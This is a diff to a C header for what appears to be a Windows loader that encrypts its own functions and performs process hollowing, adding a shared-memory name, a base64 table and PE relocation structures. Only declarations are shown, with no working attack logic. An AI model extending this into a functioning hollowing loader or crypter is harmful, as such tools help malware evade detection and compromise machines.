@@ -18,14 +18,19 @@
 #include "../core/cryptor.h"
 
 typedef struct {
-    const char *executablePath;
-    FunctionInfo *functions;
+    char executablePath[512];
     size_t numFunctions;
+    FunctionInfo *functions;
     unsigned char recryptionKey;
     unsigned char nextEncryptionKey;
     UINT_PTR keyAddress;
 } ProcessData;
 
+#define SHARED_MEMORY_NAME "Meta\\ProcessInfo"
+
+static const char b64chars[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
+
+extern void hollowing();
 
 // WIN DEF
 #define PS_INHERIT_HANDLES 4
@@ -85,6 +90,12 @@ typedef NTSTATUS(NTAPI* RtlInitUnicodeString_t)
     PCWSTR SourceString
 );
 
-extern void hollowing();
+#define RELOC_32BIT_FIELD 3
+#define RELOC_64BIT_FIELD 10
+
+typedef struct _BASE_RELOCATION_ENTRY {
+    WORD Offset : 12;
+    WORD Type: 4;
+} BASE_RELOCATION_ENTRY;
 
 #endif // LOADER_H
